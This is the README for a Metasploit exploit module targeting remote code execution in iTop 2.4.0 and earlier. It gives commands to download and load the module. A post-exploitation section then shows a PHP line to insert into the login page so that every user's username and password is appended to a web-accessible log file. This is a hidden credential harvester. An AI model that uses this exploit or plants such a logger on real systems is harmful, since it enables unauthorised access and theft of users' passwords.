# Metasploit module for RCE in iTop <= 2.4.0

Installation:
------

```bash
mkdir -p ~/.msf4/modules/exploits/itop/
wget https://github.com/attackercan/itop-2.4.0-rce/itop_rce.rb -O ~/.msf4/modules/exploits/itop/
msfconsole
use exploit/itop/itop_rce
```

Post-exploitation:
------

After you have RCE, you can sniff successful login attempts by changing `./application/loginwebpage.class.inc.php`:

```php
	// User is Ok, let's save it in the session and proceed with normal login
>>>>>	file_put_contents('./css/ui-lightness/images/log.txt', $sAuthUser.":".$sAuthPwd."\r\n", FILE_APPEND);
```
